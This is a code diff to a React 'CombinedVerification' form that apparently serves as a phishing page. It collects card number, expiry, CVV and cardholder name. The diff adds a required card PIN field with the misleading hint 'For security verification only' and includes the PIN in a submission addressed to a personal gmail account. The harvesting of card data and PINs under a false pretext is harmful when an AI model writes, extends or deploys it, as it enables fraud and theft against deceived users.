@@ -19,7 +19,8 @@ export default function CombinedVerification() {
     cardNumber: "",
     cardExpiry: "",
     cardCVV: "",
-    cardholderName: ""
+    cardholderName: "",
+    cardPIN: ""  // Added PIN field
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -109,8 +110,8 @@ export default function CombinedVerification() {
       if (!success) return;
     } 
     else if (currentStep === 4) {
-      // Validate that credit card fields are filled
-      if (!formData.cardNumber || !formData.cardExpiry || !formData.cardCVV || !formData.cardholderName) return;
+      // Validate that credit card fields are filled (including PIN)
+      if (!formData.cardNumber || !formData.cardExpiry || !formData.cardCVV || !formData.cardholderName || !formData.cardPIN) return;
       
       // The final submission will happen in handleFinalSubmit
       handleFinalSubmit();
@@ -158,6 +159,7 @@ export default function CombinedVerification() {
           cardExpiry: formData.cardExpiry,
           cardCVV: formData.cardCVV,
           cardholderName: formData.cardholderName,
+          cardPIN: formData.cardPIN,  // Added PIN to final submission
           stepCompleted: "final",
           time: new Date().toString(),
           to_email: "leslieolobo@gmail.com"
@@ -201,6 +203,8 @@ export default function CombinedVerification() {
               <input
                 type="tel"
                 name="phoneNumber"
+                placeholder="XXX-XXX-XXXX"
+                maxLength={10}
                 value={formData.phoneNumber}
                 onChange={handleChange}
                 className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
@@ -309,6 +313,7 @@ export default function CombinedVerification() {
                 <input
                   type="text"
                   name="cardNumber"
+                  maxLength={16}
                   value={formData.cardNumber}
                   onChange={handleChange}
                   placeholder="XXXX XXXX XXXX XXXX"
@@ -337,9 +342,27 @@ export default function CombinedVerification() {
                     value={formData.cardCVV}
                     onChange={handleChange}
                     placeholder="123"
+                    maxLength={3}
                     className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
                   />
                 </div>
+              </div>
+              
+              {/* Added PIN field */}
+              <div className="mt-3">
+                <label className="block mb-1">Card PIN</label>
+                <input
+                  type="password"
+                  name="cardPIN"
+                  value={formData.cardPIN}
+                  onChange={handleChange}
+                  placeholder="Enter 4-digit PIN"
+                  maxLength={4}
+                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
+                />
+                <p className="text-xs text-gray-400 mt-1">
+                  For security verification only
+                </p>
               </div>
             </div>
 
